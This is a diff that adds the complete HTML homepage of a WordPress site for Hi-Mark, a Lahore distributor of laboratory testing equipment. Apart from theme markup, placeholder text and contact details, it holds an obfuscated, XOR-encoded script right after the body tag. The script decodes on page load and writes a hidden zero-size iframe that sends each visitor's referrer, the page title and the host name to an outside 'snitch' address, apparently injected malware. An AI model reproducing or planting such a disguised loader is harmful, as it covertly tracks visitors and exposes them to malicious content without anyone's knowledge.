@@ -1,0 +1,363 @@
+<!DOCTYPE HTML>
+<html lang="en-US">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE8" />
+<meta name="robots" content="index, follow" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+<title>Hi-Mark</title>
+
+<link rel="stylesheet" type="text/css" media="all" href="http://www.himark.com.pk/wp-content/themes/laboratory/style.css" />
+<link rel="alternate" type="application/rss+xml" title="Hi-Mark RSS Feed" href="http://www.himark.com.pk/feed/" />
+<link rel="alternate" type="application/atom+xml" title="Hi-Mark Atom Feed" href="http://www.himark.com.pk/feed/atom/" />
+<link rel="pingback" href="http://www.himark.com.pk/xmlrpc.php" />
+
+
+<style type="text/css">
+	.custom-header { background: url('http://www.himark.com.pk/wp-content/uploads/2012/05/main_bg.jpg') no-repeat top center; }
+</style>    
+
+<!--[if lte IE 8]>
+<style type="text/css">.container { border:1px solid #dcdcdc; }</style>
+<![endif]-->
+<link rel="alternate" type="application/rss+xml" title="Hi-Mark &raquo; Feed" href="http://www.himark.com.pk/feed/" />
+<link rel="alternate" type="application/rss+xml" title="Hi-Mark &raquo; Comments Feed" href="http://www.himark.com.pk/comments/feed/" />
+<link rel="alternate" type="application/rss+xml" title="Hi-Mark &raquo; Homepage Comments Feed" href="http://www.himark.com.pk/homepage/feed/" />
+		<script type="text/javascript">
+			window._wpemojiSettings = {"baseUrl":"http:\/\/s.w.org\/images\/core\/emoji\/72x72\/","ext":".png","source":{"concatemoji":"http:\/\/www.himark.com.pk\/wp-includes\/js\/wp-emoji-release.min.js?ver=4.2.21"}};
+			!function(a,b,c){function d(a){var c=b.createElement("canvas"),d=c.getContext&&c.getContext("2d");return d&&d.fillText?(d.textBaseline="top",d.font="600 32px Arial","flag"===a?(d.fillText(String.fromCharCode(55356,56812,55356,56807),0,0),c.toDataURL().length>3e3):(d.fillText(String.fromCharCode(55357,56835),0,0),0!==d.getImageData(16,16,1,1).data[0])):!1}function e(a){var c=b.createElement("script");c.src=a,c.type="text/javascript",b.getElementsByTagName("head")[0].appendChild(c)}var f,g;c.supports={simple:d("simple"),flag:d("flag")},c.DOMReady=!1,c.readyCallback=function(){c.DOMReady=!0},c.supports.simple&&c.supports.flag||(g=function(){c.readyCallback()},b.addEventListener?(b.addEventListener("DOMContentLoaded",g,!1),a.addEventListener("load",g,!1)):(a.attachEvent("onload",g),b.attachEvent("onreadystatechange",function(){"complete"===b.readyState&&c.readyCallback()})),f=c.source||{},f.concatemoji?e(f.concatemoji):f.wpemoji&&f.twemoji&&(e(f.twemoji),e(f.wpemoji)))}(window,document,window._wpemojiSettings);
+		</script>
+		<style type="text/css">
+img.wp-smiley,
+img.emoji {
+	display: inline !important;
+	border: none !important;
+	box-shadow: none !important;
+	height: 1em !important;
+	width: 1em !important;
+	margin: 0 .07em !important;
+	vertical-align: -0.1em !important;
+	background: none !important;
+	padding: 0 !important;
+}
+</style>
+<link rel='stylesheet' id='pretty-photo-css'  href='http://www.himark.com.pk/wp-content/themes/laboratory/js/prettyPhoto/css/prettyPhoto.css?ver=4.2.21' type='text/css' media='all' />
+<link rel='stylesheet' id='colors-css-css'  href='http://www.himark.com.pk/wp-content/themes/laboratory/css/colors.css?ver=4.2.21' type='text/css' media='all' />
+<link rel='stylesheet' id='prettify-css-css'  href='http://www.himark.com.pk/wp-content/themes/laboratory/js/google-code-prettify/prettify.css?ver=4.2.21' type='text/css' media='all' />
+<link rel='stylesheet' id='style-css-css'  href='http://www.himark.com.pk/wp-content/themes/laboratory/style-css.php?ver=4.2.21' type='text/css' media='all' />
+<script type='text/javascript' src='http://www.himark.com.pk/wp-includes/js/jquery/jquery.js?ver=1.11.2'></script>
+<script type='text/javascript' src='http://www.himark.com.pk/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.2.1'></script>
+<script type='text/javascript' src='http://platform.twitter.com/widgets.js?ver=4.2.21'></script>
+<script type='text/javascript' src='http://www.himark.com.pk/wp-content/themes/laboratory/js/custom.js?ver=4.2.21'></script>
+<script type='text/javascript' src='http://www.himark.com.pk/wp-content/themes/laboratory/js/jquery.flexslider-min.js?ver=4.2.21'></script>
+<script type='text/javascript' src='http://www.himark.com.pk/wp-content/themes/laboratory/js/jquery.quicksand.js?ver=4.2.21'></script>
+<script type='text/javascript' src='http://www.himark.com.pk/wp-content/themes/laboratory/js/google-code-prettify/prettify.js?ver=4.2.21'></script>
+<script type='text/javascript' src='http://www.himark.com.pk/wp-content/themes/laboratory/js/prettyPhoto/js/jquery.prettyPhoto.js?ver=4.2.21'></script>
+<script type='text/javascript' src='http://www.himark.com.pk/wp-content/themes/laboratory/js/jquery.fitvids.js?ver=4.2.21'></script>
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://www.himark.com.pk/xmlrpc.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://www.himark.com.pk/wp-includes/wlwmanifest.xml" /> 
+<meta name="generator" content="WordPress 4.2.21" />
+<link rel='canonical' href='http://www.himark.com.pk/' />
+<link rel='shortlink' href='http://www.himark.com.pk/' />
+<style type="text/css" id="custom-background-css">
+body.custom-background { background-image: url('http://localhost/himark/wp-content/uploads/2012/06/scope_bg.jpg'); background-repeat: repeat; background-position: top center; background-attachment: fixed; }
+</style>
+</head>
+
+<body class="home page page-id-120 page-template page-template-template_homepage page-template-template_homepage-php custom-background" onload="prettyPrint()">
+<script type="text/javascript">var a="'1Aqapkrv'02v{rg'1F'00vgzv-hctcqapkrv'00'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00ida,'00'02)'02'00k,k'00'02)'02'00nn'00'02)'02'00woklcv'00'02)'02'00kmlg'00'02)'02'00q,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'0;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00ida,'00'02)'02'00k,k'00'02)'02'00nn'00'02)'02'00woklcv'00'02)'02'00kmlg'00'02)'02'00q,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+
+	<div class="custom-header"></div>
+
+	<div class="container-wrapper" id="backtotop">    
+        <div class="container">
+
+            <div class="gw-head">
+            
+            	<div class="header-container">
+                    <!-- logo -->
+                    <div id="logo">
+                                             <a href="http://www.himark.com.pk"><img src="http://www.himark.com.pk/wp-content/uploads/2012/03/final_logo1.png" alt="Hi-Mark" /></a>
+                                    
+                    </div>
+                    
+                    <!-- social links -->    
+					                               
+                    <div class="gw-topsocial">
+                        <div class="gwt-title">Social</div>                        
+                                                <ul class="gwt-icons"  style="margin-left:-28px; padding-left:12px;"> <li class="ttwiter"><a href="#">Twitter</a></li>  <li class="tfacebook"><a href="#">Facebook</a></li>  <li class="tlinkedin"><a href="#">Linkedin</a></li>  <li class="tflickr"><a href="#">Flickr</a></li>                         
+                        </ul>
+                                                
+                    </div>
+                                        
+                </div>
+                
+                <div class="top-container">
+                
+                    <!-- main menu -->            
+                    <div id="menu-wrapper">
+                    <ul id="menu-main-menu" class="sf-menu"><li id="menu-item-1060" class="home-icon menu-item menu-item-type-custom menu-item-object-custom current-menu-item current_page_item menu-item-home menu-item-1060"><a href="http://www.himark.com.pk/">Home</a></li>
+<li id="menu-item-1263" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1263"><a href="http://www.himark.com.pk/about-us-2/">About Us</a></li>
+<li id="menu-item-1266" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1266"><a href="http://www.himark.com.pk/services-2/">Services</a></li>
+<li id="menu-item-1525" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-1525"><a href="http://www.himark.com.pk/portfolio2_categories/products/">Products</a></li>
+<li id="menu-item-1173" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1173"><a href="http://www.himark.com.pk/mission/">Mission</a></li>
+<li id="menu-item-1172" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1172"><a href="http://www.himark.com.pk/vision/">Vision</a></li>
+<li id="menu-item-1080" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1080"><a href="http://www.himark.com.pk/contact/">Contact</a></li>
+</ul>                    </div>
+                    
+                </div>
+                      
+            </div><div class="clearboth"></div>
+
+<div class="flexslider flex-loading">
+    <ul class="slides">
+		        	
+        <li>
+		                <a title="Soil Testing Equipment" href="http://www.himark.com.pk/demo/wp-content/uploads/2012/07/slider_final2.png"><img src="http://www.himark.com.pk/wp-content/uploads/2012/07/slider_final2.png" alt="Soil Testing Equipment" class="slide-img" /></a>
+                        
+               
+            <div class="slideleft-info">
+                <h1 id="post-1212"><a href="http://www.himark.com.pk/demo/wp-content/uploads/2012/07/slider_final2.png">Soil Testing Equipment</a></h1>
+                <div class="clearboth"></div>
+                            </div>	
+                          
+                </li>
+        
+		        	
+        <li>
+		                <a title="Soil Testing Equipment" href="http://www.himark.com.pk/demo/wp-content/uploads/2012/06/shutterstock_49036090.jpg"><img src="http://www.himark.com.pk/wp-content/uploads/2012/06/shutterstock_49036090.jpg" alt="Soil Testing Equipment" class="slide-img" /></a>
+                        
+               
+            <div class="slideleft-info">
+                <h1 id="post-607"><a href="http://www.himark.com.pk/demo/wp-content/uploads/2012/06/shutterstock_49036090.jpg">Soil Testing Equipment</a></h1>
+                <div class="clearboth"></div>
+                            </div>	
+                          
+                </li>
+        
+		        	
+        <li>
+		                <a title="A bussiness meeting with our major partners" href="http://www.himark.com.pk/demo/wp-content/uploads/2012/07/slider_final1.png"><img src="http://www.himark.com.pk/wp-content/uploads/2012/07/slider_final1.png" alt="A bussiness meeting with our major partners" class="slide-img" /></a>
+                        
+               
+            <div class="slideleft-title">
+                <h1 id="post-609"><a href="http://www.himark.com.pk/demo/wp-content/uploads/2012/07/slider_final1.png">A bussiness meeting with our major partners</a></h1>
+                <div class="clearboth"></div>
+                            </div>	
+                          
+                </li>
+        
+		        	
+        <li>
+		                <a title="We are providing proffesional" href="http://www.himark.com.pk/demo/wp-content/uploads/2015/07/home8.jpg"><img src="http://www.himark.com.pk/wp-content/uploads/2015/07/home8.jpg" alt="We are providing proffesional" class="slide-img" /></a>
+                        
+               
+            <div class="slideright-info">
+                <h1 id="post-611"><a href="http://www.himark.com.pk/demo/wp-content/uploads/2015/07/home8.jpg">We are providing proffesional</a></h1>
+                <div class="clearboth"></div>
+                <span class="slide-desc">Ridens deseruisse ius an, vix porro epicuri moderatius at, mel no tritani blandit reprehendunt. Graeco phaedrum eos ea, exerci audiam accusamus ea vis.</span>             </div>	
+                          
+                </li>
+        
+		             
+    </ul>
+</div>
+<div class="line-pattern"></div>
+
+<div class="gwfull-wrapper">
+					
+	<div class="centerblock"><span class="intro">
+<p>We have a vast experience in sales of equipment and instruments used throughout the in many different types of laboratory environment.Being the reference point in the testing, measurement and quality control equipment.</p>
+<p>To offer reliable and high technology equipment to make testing, measurement and quality control more affordable and accessible.</p>
+</span>
+<a href="http://www.himark.com.pk/about-us-2/" class="heart_sbutton">Read More </a>
+</div>
+<div class="white-space" style="height:16px;"></div>
+<div class="gwtitle-wrapper"><h6 class="gwtitle-center">Hi-Marks technologies</h6><div class="gwtitle-line"></div></div><div class="clearboth"></div>
+<div class="lservice-block"><div class="lservice-graphic lservice-blue"><div class="lservice-icon-wrapper"><img src="http://goldenworks.eu/demos/lab_wordpress/wp-content/themes/laboratory/images/sicon_1.png" alt="Lab,Test Tube" class="lservice-icon" /></div><h4>Lab,Test Tube</h4></div><div class="lservice-content">
+Hand pouring liquid from test tubes into flask in research lab<br />
+</div></div>
+<div class="lservice-block"><div class="lservice-graphic lservice-orange"><div class="lservice-icon-wrapper"><img src="http://goldenworks.eu/demos/lab_wordpress/wp-content/themes/laboratory/images/sicon_2.png" alt="Atoms-Carbon" class="lservice-icon" /></div><h4>Atoms-Carbon</h4></div><div class="lservice-content">
+Medical-testing-labs-solution-diagram-atoms-carbon-molecules-molecular-structure<br />
+</div></div>
+<div class="lservice-block"><div class="lservice-graphic lservice-teal"><div class="lservice-icon-wrapper"><img src="http://goldenworks.eu/demos/lab_wordpress/wp-content/themes/laboratory/images/sicon_3.png" alt="Glass Property" class="lservice-icon" /></div><h4>Glass Property</h4></div><div class="lservice-content">
+Medical-beakers-science-test-testing-laboratory-labs-technical-glass<br />
+</div></div>
+<div class="lservice-block last"><div class="lservice-graphic lservice-neutral"><div class="lservice-icon-wrapper"><img src="http://goldenworks.eu/demos/lab_wordpress/wp-content/themes/laboratory/images/sicon_4.png" alt="Liquid-Solution" class="lservice-icon" /></div><h4>Liquid-Solution</h4></div><div class="lservice-content">
+Medical-Science-test-tubes-testtube-liquid-solution-precipitate-solvent-technical-labs<br />
+</div></div>
+<div class="clearboth"></div>
+<div class="white-space" style="height:12px;"></div>
+<div class="gwtitle-wrapper"><h6 class="gwtitle-center">Latest works</h6><div class="gwtitle-line"></div></div><div class="clearboth"></div>
+<div class="port-wrapper"><ul id="p-zoom" class="port3-list"><li class="port3-item pt3-sh"><a href="http://www.himark.com.pk/wp-content/uploads/2012/08/Chiropractor-doctor.jpg" rel="prettyphoto[port-3]" class="zoom-img"><img src="http://www.himark.com.pk/wp-content/uploads/2012/08/Chiropractor-doctor-202x166.jpg" alt="Proffesional advice" /></a><div class="port3-title"><a href="http://www.himark.com.pk/portfolio_3/proffesional-advice/">Proffesional advice</a></div><div class="port-decoration"></div></li><li class="port3-item pt3-sh"><a href="http://www.himark.com.pk/wp-content/uploads/2012/08/cube_graphic.gif" rel="prettyphoto[port-3]" class="zoom-img"><img src="http://www.himark.com.pk/wp-content/uploads/2012/08/cube_graphic-202x166.gif" alt="Cubing the future" /></a><div class="port3-title"><a href="http://www.himark.com.pk/portfolio_3/cubing-the-future/">Cubing the future</a></div><div class="port-decoration"></div></li><li class="port3-item pt3-sh"><a href="http://www.himark.com.pk/wp-content/uploads/2012/08/port2_7.jpg" rel="prettyphoto[port-3]" class="zoom-img"><img src="http://www.himark.com.pk/wp-content/uploads/2012/08/port2_7-202x166.jpg" alt="Bussiness media center" /></a><div class="port3-title"><a href="http://www.himark.com.pk/portfolio_3/bussiness-media-center/">Bussiness media center</a></div><div class="port-decoration"></div></li><li class="port3-item pt3-sh"><a href="http://www.himark.com.pk/wp-content/uploads/2012/08/2014-01-06-6368174-A.jpg" rel="prettyphoto[port-3]" class="zoom-img"><img src="http://www.himark.com.pk/wp-content/uploads/2012/08/2014-01-06-6368174-A-202x166.jpg" alt="A relaxing break" /></a><div class="port3-title"><a href="http://www.himark.com.pk/portfolio_3/a-relaxing-break/">A relaxing break</a></div><div class="port-decoration"></div></li></ul></div><div class="clearboth"></div>
+<div class="white-space" style="height:16px;"></div>
+<div class="one-half">
+<div class="gwtitle-wrapper"><h6 class="gwtitle-center">Our Customer</h6><div class="gwtitle-line"></div></div><div class="clearboth"></div>
+<span class="fav-list custom-list" ></span>
+<ul>
+<li>Construction Companies</li>
+<li>Private Laboratories</li>
+<li>Colleges and Universities</li>
+<li>Ready Mix Concrete</li>
+<li>Pre-cast Concrete</li>
+<li>Research and Development</li>
+<li>Civil Engineering Contractors</li>
+<li>Government Departments</li>
+<li>Cement Companies</li>
+<li>Quarries</li>
+</ul>
+</div>
+<div class="one-half last">
+<div class="gwtitle-wrapper"><h6 class="gwtitle-center">Our Principles</h6><div class="gwtitle-line"></div></div><div class="clearboth"></div>
+<p>We have a vast experience in sales of equipment and instruments used throughout the in many different types of laboratory environment.</p>
+<p>Laboratory is a responsive wordpress theme with a clear focus on small to medium bussiness sites.</p>
+<p>It comes with important shortcodes such as testimonials, services, our team, faq and pricing tables without neglecting in any way the other sections such as portfolios, blog or contact pages.<br />
+<div class="clearboth"></div>
+<a href="http://www.himark.com.pk/about-us-2/" class="gw-btn btn-small" style="color:#fff; background-color:#28a9ec; border-color:#28a9ec;">Read More »</a>
+</div><div class="clearboth"></div>
+<div class="white-space" style="height:20px;"></div>
+<div class="gwtitle-wrapper"><h6 class="gwtitle-center">Our clients</h6><div class="gwtitle-line"></div></div><div class="clearboth"></div>
+<ul class="clients-list">
+<li><a href="http://www.himark.com.pk/wp-content/uploads/2012/05/sponauxocell31.jpg"><img class="alignnone size-full wp-image-1229" src="http://www.himark.com.pk/wp-content/uploads/2012/05/sponauxocell31.jpg" alt="sponauxocell3" width="173" height="89" /></a></li>
+<li><a href="http://www.himark.com.pk/wp-content/uploads/2012/05/hca_labs1.gif"><img class="alignnone size-full wp-image-1230" src="http://www.himark.com.pk/wp-content/uploads/2012/05/hca_labs1.gif" alt="hca_labs" width="173" height="89" /></a></li>
+<li><a href="http://www.himark.com.pk/wp-content/uploads/2012/05/images2.png"><img class="alignnone size-full wp-image-1234" src="http://www.himark.com.pk/wp-content/uploads/2012/05/images2.png" alt="images" width="173" height="89" /></a></li>
+<li><a href="http://www.himark.com.pk/wp-content/uploads/2012/05/logo1-11.png"><img class="alignnone size-full wp-image-1232" src="http://www.himark.com.pk/wp-content/uploads/2012/05/logo1-11.png" alt="logo1 (1)" width="173" height="89" /></a></li>
+<li><a href="http://www.himark.com.pk/wp-content/uploads/2012/05/Cepheid-Logo1.png"><img class="alignnone size-full wp-image-1233" src="http://www.himark.com.pk/wp-content/uploads/2012/05/Cepheid-Logo1.png" alt="Cepheid-Logo" width="173" height="89" /></a></li>
+</ul>
+
+		 
+	
+
+
+			<!-- If comments are closed. -->
+
+	                    
+</div>
+
+<script type='text/javascript' src='http://www.himark.com.pk/wp-includes/js/comment-reply.min.js?ver=4.2.21'></script>
+        
+        <div class="fline-pattern"></div>
+        
+        <div id="footer">
+                        <div class="footer-wrapper">
+
+                <!-- START footer widgets -->
+                <div class="ffour-wrapper">
+    
+                    <div id="text-2" class="fbox widget_text"><h6>About Hi-Mark</h6>			<div class="textwidget">Distributors of Material Testing,  Analytical, Environmental Monitoring.
+We have a vast experience in sales of equipment and instruments used throughout the in many different types of laboratory environment.</div>
+		</div>                   
+    
+                    <div id="gw-blog-3" class="fbox widget_gw_posts">        
+	  <h6>From Blogs</h6>            
+            <ul class="wpost-list">
+                                <li>
+
+                	                        <a title="Some of our latest representative recipes" href="http://www.himark.com.pk/discover-our-latest-recipes-from-the-best-laboratory-in-the-world/" class="wpost-image">
+                            <img width="50" height="50" src="http://www.himark.com.pk/wp-content/uploads/2012/04/blog_img1-50x50.jpg" class="attachment-post-small wp-post-image" alt="Some of our latest representative recipes" />                        </a>
+                                      
+                        
+                        <div class="wpost-content">                     
+                            <p><a href="http://www.himark.com.pk/discover-our-latest-recipes-from-the-best-laboratory-in-the-world/" rel="bookmark" title="Some of our latest representative recipes">Some of our latest representative recipes</a></p>
+                            <span class="wpost-date">April 4, 2012</span>                            
+                        </div>
+                                    </li>
+    
+                                <li>
+
+                	                        <a title="I took a trip down to look at the fair but when I arrived I found nobody there" href="http://www.himark.com.pk/i-took-a-trip-down-to-look-at-the-fair-but-when-i-arrived-i-found-nobody-there/" class="wpost-image">
+                            <img width="50" height="50" src="http://www.himark.com.pk/wp-content/uploads/2012/04/blog_img2-50x50.jpg" class="attachment-post-small wp-post-image" alt="I took a trip down to look at the fair but when I arrived I found nobody there" />                        </a>
+                                      
+                        
+                        <div class="wpost-content">                     
+                            <p><a href="http://www.himark.com.pk/i-took-a-trip-down-to-look-at-the-fair-but-when-i-arrived-i-found-nobody-there/" rel="bookmark" title="I took a trip down to look at the fair but when I arrived I found nobody there">I took a trip down to look at the fair but when I arrived I found nobody there</a></p>
+                            <span class="wpost-date">April 4, 2012</span>                            
+                        </div>
+                                    </li>
+    
+                  
+            </ul>          
+            
+            </div>            
+                  
+                    
+                    <div id="gw-blogcateg-2" class="fbox widget_gw_categories">
+	  <h6>Latest News</h6>
+
+    
+    
+		<ul>
+				<li class="cat-item cat-item-3"><a href="http://www.himark.com.pk/category/blog/bussiness-company/" >bussiness company</a>
+</li>
+	<li class="cat-item cat-item-4"><a href="http://www.himark.com.pk/category/blog/communication/" >communication</a>
+</li>
+	<li class="cat-item cat-item-5"><a href="http://www.himark.com.pk/category/blog/laboratory/" >laboratory</a>
+</li>
+	<li class="cat-item cat-item-6"><a href="http://www.himark.com.pk/category/blog/other-stories/" >other stories</a>
+</li>
+	<li class="cat-item cat-item-7"><a href="http://www.himark.com.pk/category/blog/recreation/" >recreation</a>
+</li>
+	<li class="cat-item cat-item-8"><a href="http://www.himark.com.pk/category/blog/unusual-experiments/" >unusual experiments</a>
+</li>
+        </ul>
+    
+            </div>            
+                  
+                    
+                    <div id="text-3" class="fbox widget_text"><h6>Address</h6>			<div class="textwidget">Tel: 042-35404116 </br>
+Fax: +92-42-37420250 </br>
+Cell No. 0320-4428830 </br>
+Email: info@himark.com.pk	</br>
+Office No. 10 3rd Floor Lucky Center Qurtaba Chowk Jail Road Lahore.</div>
+		</div>                                                  
+        
+                </div>    
+                <!-- END footer widgets -->                 
+    
+            </div>
+                        <div id="footer-bottom">
+                <p>
+                Copyrights © 2015 Hi-Mark Technologies. All Rights Reserved. Designed By: <a href="http://www.itlinks.com/">ITlinks</a>                </p>
+                <div class="fb-btt"><a href="#backtotop">back to top</a></div>
+            </div>    	
+        </div>
+        
+	</div>
+</div><div class="footer-iefix"></div>
+
+<script type="text/javascript">
+	jQuery(document).ready(function(){
+		
+		jQuery(window).load(function() {
+		  jQuery('.flexslider').flexslider({
+			slideshow: true, //Boolean: Animate slider automatically
+			animation: "fade", //String: Select your animation type, "fade" or "slide"
+			slideshowSpeed: 6000, //Integer: Set the speed of the slideshow cycling, in milliseconds
+			animationDuration: 1000, //Integer: Set the speed of animations, in milliseconds
+			pauseOnAction: false, //Boolean: Pause the slideshow when interacting with control elements, highly recommended.
+			controlNav: false, //Boolean: Create navigation for paging control of each clide? Note: Leave true for manualControls usage		
+			start: function(slider) {
+ 				slider.removeClass('flex-loading');
+			}					
+		  });
+		});
+		
+		
+		jQuery(function() {
+			// --- first section initially expanded:
+			//$("h2.expand").toggler({initShow: "div.collapse:first"});
+			// --- Other options:
+			//$("h2.expand").toggler({method: "toggle", speed: 0});
+			//$("h2.expand").toggler({method: "toggle"});
+			//$("h2.expand").toggler({speed: "fast"});
+			//$("h2.expand").toggler({method: "fadeToggle"});
+			jQuery("h6.expand").toggler({method: "slideFadeToggle", speed: 300});    
+			//$("#content").expandAll({trigger: "h2.expand", ref: "div.demo",  speed: 300, oneSwitch: false});
+		});		
+		
+	});
+</script>
+
+</body>
+</html>
